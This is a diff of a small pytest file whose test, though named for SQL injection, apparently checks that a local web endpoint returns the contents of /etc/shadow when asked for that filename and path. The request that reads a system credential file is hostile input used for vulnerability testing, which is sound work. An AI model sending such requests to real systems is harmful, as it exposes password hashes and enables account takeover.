@@ -1,8 +1,8 @@
 import pytest
-from requests import post, Session, get
+from requests import post
 
-s = Session()
 
 def test_sql_injection():
-    assert s.post('http://localhost/file_upload', data={'filename':'shadow', 'path':'/etc'}).ok
+    r = post('http://localhost/return-files', data={'filename':'shadow', 'path':'/etc'})
+    assert 'root:!::0:::::' in r.text
 
